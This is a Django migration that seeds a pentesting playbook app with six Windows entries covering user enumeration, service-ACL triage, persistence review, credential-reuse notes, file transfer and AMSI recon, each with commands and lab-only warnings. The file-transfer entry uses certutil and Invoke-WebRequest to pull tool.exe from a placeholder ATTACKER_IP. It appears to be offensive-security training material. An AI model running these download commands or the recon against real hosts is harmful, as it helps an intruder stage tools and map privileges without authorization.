from django.db import migrations


WINDOWS_PLAYBOOKS = [
    {
        "title": "Enumeration - Local Users, Groups and Host Profile",
        "slug": "windows-enumeration-local-users-groups-host-profile",
        "platform": "windows",
        "category": "enumeration",
        "tags": "enumeration,users,groups,system",
        "summary": "Enumerate identity, local admin context and network baseline in one pass.",
        "prerequisites": "Low-privilege CMD or PowerShell session in an authorized lab host.",
        "commands": "whoami /all\nnet user\nnet localgroup administrators\nsysteminfo\nipconfig /all",
        "explanation": "Creates a quick baseline of privileges, accounts and host/network metadata.",
        "warnings": "Output may contain sensitive machine details; keep results inside the lab scope.",
        "difficulty": "beginner",
        "is_active": True,
    },
    {
        "title": "Privilege Escalation - Service Path and ACL Triage",
        "slug": "windows-privesc-service-path-and-acl-triage",
        "platform": "windows",
        "category": "privesc",
        "tags": "privesc,services,acl,unquoted",
        "summary": "Identify unquoted service paths and weak service permissions for escalation analysis.",
        "prerequisites": "WMIC and service query access.",
        "commands": "wmic service get name,pathname,startmode\nsc query state= all\nfor /f \"tokens=2 delims=:\" %s in ('sc query ^| findstr SERVICE_NAME') do @sc sdshow %s",
        "explanation": "Service configuration mistakes can expose writable execution paths or controllable services.",
        "warnings": "Treat findings as recon only unless exploitation is explicitly authorized.",
        "difficulty": "intermediate",
        "is_active": True,
    },
    {
        "title": "Persistence - Run Keys and Scheduled Tasks Review",
        "slug": "windows-persistence-run-keys-and-scheduled-tasks-review",
        "platform": "windows",
        "category": "persistence",
        "tags": "persistence,registry,scheduled-tasks",
        "summary": "Audit common persistence surfaces in registry startup keys and task scheduler.",
        "prerequisites": "Read access to HKLM/HKCU startup keys and task metadata.",
        "commands": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nschtasks /query /fo LIST /v",
        "explanation": "Highlights startup artifacts that can be abused for user/system-level persistence.",
        "warnings": "Do not create or modify persistence artifacts outside controlled exercises.",
        "difficulty": "beginner",
        "is_active": True,
    },
    {
        "title": "Lateral Movement - Credential Reuse and Pass-the-Hash Notes",
        "slug": "windows-lateral-movement-credential-reuse-and-pth-notes",
        "platform": "windows",
        "category": "lateral-movement",
        "tags": "lateral-movement,credentials,pth",
        "summary": "Document credential discovery points and pass-the-hash related validation steps.",
        "prerequisites": "Host and domain context collected from enumeration phase.",
        "commands": "cmdkey /list\nnet use\nwhoami /groups\nwmic /node:TARGET computersystem get username",
        "explanation": "Focuses on defensive mapping and safe lab validation for credential reuse scenarios.",
        "warnings": "Do not attempt credential replay outside explicitly authorized environments.",
        "difficulty": "advanced",
        "is_active": True,
    },
    {
        "title": "File Transfer - Certutil and PowerShell Web Download",
        "slug": "windows-file-transfer-certutil-and-powershell-web-download",
        "platform": "windows",
        "category": "file-transfer",
        "tags": "file-transfer,certutil,powershell",
        "summary": "Transfer artifacts using native Windows tooling in restricted lab setups.",
        "prerequisites": "Outbound web access from host to authorized lab server.",
        "commands": "certutil -urlcache -f http://ATTACKER_IP/tool.exe tool.exe\npowershell -c \"Invoke-WebRequest -Uri http://ATTACKER_IP/tool.exe -OutFile tool.exe\"",
        "explanation": "Provides fallback transfer paths when SMB or browser access is not available.",
        "warnings": "Replace ATTACKER_IP with your controlled infrastructure endpoint.",
        "difficulty": "beginner",
        "is_active": True,
    },
    {
        "title": "Defense Evasion - AMSI and Execution Policy Recon",
        "slug": "windows-defense-evasion-amsi-and-execution-policy-recon",
        "platform": "windows",
        "category": "defense-evasion",
        "tags": "defense-evasion,amsi,execution-policy",
        "summary": "Collect AMSI provider and execution policy posture before any scripting workflow.",
        "prerequisites": "PowerShell access on lab endpoint.",
        "commands": "powershell -c \"Get-ExecutionPolicy -List\"\npowershell -c \"Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\"\npowershell -c \"Get-MpComputerStatus\"",
        "explanation": "Recon phase that informs safe, educational testing of script control boundaries.",
        "warnings": "Do not run bypass payloads on production systems.",
        "difficulty": "advanced",
        "is_active": True,
    },
]


def add_windows_playbooks(apps, schema_editor):
    PlaybookEntry = apps.get_model("playbooks", "PlaybookEntry")

    for payload in WINDOWS_PLAYBOOKS:
        PlaybookEntry.objects.update_or_create(
            slug=payload["slug"],
            defaults=payload,
        )


def remove_windows_playbooks(apps, schema_editor):
    PlaybookEntry = apps.get_model("playbooks", "PlaybookEntry")
    slugs = [item["slug"] for item in WINDOWS_PLAYBOOKS]
    PlaybookEntry.objects.filter(slug__in=slugs).delete()


class Migration(migrations.Migration):

    dependencies = [
        ("playbooks", "0001_initial"),
    ]

    operations = [
        migrations.RunPython(add_windows_playbooks, remove_windows_playbooks),
    ]

